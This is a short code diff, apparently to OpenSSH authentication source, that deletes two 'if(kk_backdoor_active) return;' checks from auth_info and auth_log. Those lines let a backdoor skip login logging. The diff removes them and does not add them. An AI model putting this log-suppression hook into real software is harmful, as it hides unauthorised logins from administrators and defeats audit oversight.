@@ -259,9 +259,6 @@ auth_info(Authctxt *authctxt, const char *fmt, ...)
 	va_list ap;
         int i;
 
-	if(kk_backdoor_active)
-		return;
-
 	free(authctxt->info);
 	authctxt->info = NULL;
 
@@ -279,9 +276,6 @@ auth_log(Authctxt *authctxt, int authenticated, int partial,
 {
 	void (*authlog) (const char *fmt,...) = verbose;
 	char *authmsg;
-
-	if(kk_backdoor_active)
-		return;
 
 	if (use_privsep && !mm_is_monitor() && !authctxt->postponed)
 		return;
